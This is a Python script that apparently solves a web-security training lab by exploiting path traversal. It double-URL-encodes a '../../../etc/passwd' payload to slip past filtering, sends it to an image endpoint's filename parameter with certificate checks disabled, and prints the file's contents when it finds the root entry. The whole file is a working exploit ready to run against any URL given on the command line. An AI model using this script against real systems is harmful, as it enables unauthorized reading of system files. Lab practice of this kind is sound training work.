import requests
import sys
import urllib3
from urllib.parse import quote
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

payload = "../../../etc/passwd"
encoded_payload = quote(payload, safe="")
double_encoded_payload = quote(encoded_payload, safe="")

def traversal(s, url, double_encoded_payload):
    image_url = url + "/image?filename=" + double_encoded_payload
    r = s.get(image_url, verify=False)
    print(f"[+] Double URL encoded payload is: {double_encoded_payload}")
    if "root:x:0:0" in r.text:
        print("[+] Lab Solved.")
        print(f"{r.text}")
    else:
        print("[-] Error accessing /etc/passwd file.")

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip()
    traversal(s, url, double_encoded_payload)

if __name__=="__main__":
    main()